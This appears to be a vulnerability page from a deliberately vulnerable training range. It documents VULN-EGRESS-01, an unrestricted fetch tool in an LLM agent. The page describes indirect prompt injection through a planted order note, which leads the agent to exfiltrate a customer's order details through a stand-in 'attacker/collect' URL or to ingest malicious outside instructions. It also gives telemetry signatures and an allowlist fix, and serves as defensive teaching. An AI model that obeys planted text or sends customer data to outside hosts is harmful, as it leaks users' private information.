# VULN-EGRESS-01 — unrestricted agent egress (data exfiltration / ingest)

| | |
|---|---|
| **Flag** | `VULN-EGRESS-01` (code) — the toggleable external-access control |
| **Where** | agent-tools `fetch_reference` tool + [EgressGuardHandler.cs](../../src/AgentTools/EgressGuardHandler.cs) |
| **Class** | OWASP LLM02 (sensitive info disclosure) / LLM06 (excessive agency); A10-adjacent (SSRF-like) |
| **Threats** | CT26, TH12; assets A1, A9 |

## The weakness

The agent's tool layer exposes `fetch_reference(url)` — a deliberately broad "go and read this link"
capability (the kind ADR-0009 kept out of the agent). **VULN-EGRESS-01 is the control that governs
where that fetch may reach:**

- **Secure:** `EgressGuardHandler` allows only an allowlist of in-range store hosts
  (`store-api`, `idp`, `payment-stub`). Anything else — the honeypot, a pastebin, an attacker host —
  is refused. No exfiltration out, no ingest of outside data in.
- **Vulnerable:** the fetch reaches **any** host. A customer message, or text planted in an order
  note (indirect prompt injection), can steer the agent to:
  - **Exfiltrate** — fetch `http://attacker/collect?data=<the customer's order details>`, smuggling
    data out in the URL;
  - **Ingest** — fetch an external page and treat its contents as trusted input (malicious
    instructions, poisoned data).

## Defence in depth with the sealed agent network

This is the **runtime-toggleable** control; the sealed `agent` network (`internal: true`) is the
**static** one. ai-agent and ollama have no route off-host at all. agent-tools, though, bridges to the
service tier to reach store-api — so without this app-layer guard it *could* reach a decoy/external
host that shares that tier. Defenders flip VULN-EGRESS-01 in Range Control to watch the behaviour
change without touching the compose topology.

## How it is confirmed

With the honeypot as the "external" target:

- **Vulnerable:** ask the agent to follow the partner link in order 1002's note (or any
  `fetch_reference` to `http://honeypot:8080/…`). The fetch succeeds and **the honeypot alarms**
  (VULN-HONEYPOT-01) — you have just watched an exfil/ingest hop land.
- **Secure:** the same request is refused by the guard (`Blocked by egress policy`); the honeypot
  never sees it.

## Observe in telemetry

The `fetch_reference` tool span shows the target host; in secure mode the egress-guard refusal is
visible, in vulnerable mode the outbound call completes. A successful fetch to a non-store host is the
signature — and if that host is the honeypot, VULN-HONEYPOT-01 is the direct hit.

## Fix / design

Least-privilege egress: allowlist the hosts a tool genuinely needs and refuse the rest; never give an
LLM agent an open-ended fetch. Combine the app-layer allowlist (this flag) with the network seal
(infra) so neither alone is load-bearing. Related: [VULN-LLM-02](../VULN-LLM-02/) (tool results as
data), [VULN-MCP-01](../VULN-MCP-01/) (call as the customer), [VULN-HONEYPOT-01](../VULN-HONEYPOT-01/).
